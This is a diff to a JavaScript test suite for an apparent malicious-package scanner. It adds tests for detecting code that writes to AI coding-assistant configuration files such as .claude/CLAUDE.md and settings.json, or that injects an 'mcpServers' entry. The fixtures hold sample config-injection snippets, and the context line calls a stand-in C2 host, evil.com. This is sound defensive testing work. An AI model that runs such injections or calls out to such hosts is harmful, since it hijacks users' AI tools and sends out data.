@@ -1844,6 +1844,102 @@ fetch('https://c2.evil.com/data');
     } finally { cleanupTemp(tmp); }
   });
 
+  // ============================================
+  // SANDWORM_MODE: Plugin FP — legitimate plugin writes to config dirs
+  // ============================================
+
+  await asyncTest('AST: Write to .claude/.notifier_state.json with dynamic content → no mcp_config_injection', async () => {
+    const code = `
+const fs = require('fs');
+const path = require('path');
+const os = require('os');
+const state = { lastNotified: Date.now(), version: '1.0.0' };
+fs.writeFileSync(path.join(os.homedir(), '.claude', '.notifier_state.json'), JSON.stringify(state));
+`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'mcp_config_injection');
+      assert(!t, 'Should NOT detect mcp_config_injection for plugin state file with dynamic content');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: Write to .claude/CLAUDE.md with dynamic content → mcp_config_injection CRITICAL', async () => {
+    const code = `
+const fs = require('fs');
+const path = require('path');
+const os = require('os');
+fs.writeFileSync(path.join(os.homedir(), '.claude', 'CLAUDE.md'), payload);
+`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'mcp_config_injection');
+      assert(t, 'Should detect mcp_config_injection for CLAUDE.md write');
+      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: Write to .cursor/plugin-data.json with dynamic content → no mcp_config_injection', async () => {
+    const code = `
+const fs = require('fs');
+const path = require('path');
+fs.writeFileSync(path.join(homedir, '.cursor', 'plugin-data.json'), data);
+`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'mcp_config_injection');
+      assert(!t, 'Should NOT detect mcp_config_injection for non-sensitive file with dynamic content');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: Write to .claude/settings.json (root) with dynamic content → mcp_config_injection CRITICAL', async () => {
+    const code = `
+const fs = require('fs');
+const path = require('path');
+const os = require('os');
+fs.writeFileSync(path.join(os.homedir(), '.claude', 'settings.json'), payload);
+`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'mcp_config_injection');
+      assert(t, 'Should detect mcp_config_injection for .claude/settings.json (SANDWORM_MODE vector)');
+      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: Write to .claude/my-plugin/settings.json (subdir) with dynamic content → no mcp_config_injection', async () => {
+    const code = `
+const fs = require('fs');
+const path = require('path');
+const os = require('os');
+fs.writeFileSync(path.join(os.homedir(), '.claude', 'my-plugin', 'settings.json'), data);
+`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'mcp_config_injection');
+      assert(!t, 'Should NOT detect mcp_config_injection for settings.json in plugin subdirectory');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: Write to .claude/random.json with MCP content patterns → mcp_config_injection', async () => {
+    const code = `
+const fs = require('fs');
+const path = require('path');
+fs.writeFileSync(path.join(homedir, '.claude', 'random.json'), '{"mcpServers": {"evil": {"command": "node"}}}');
+`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'mcp_config_injection');
+      assert(t, 'Should detect mcp_config_injection when content has MCP patterns even in non-sensitive file');
+      assert(t.severity === 'CRITICAL', 'Should be CRITICAL severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
   await asyncTest('FP-P5 Fix6: Proxy severity HIGH without credential signal', async () => {
     const tmp = makeTempPkg(`
 const proxy = new Proxy(target, {
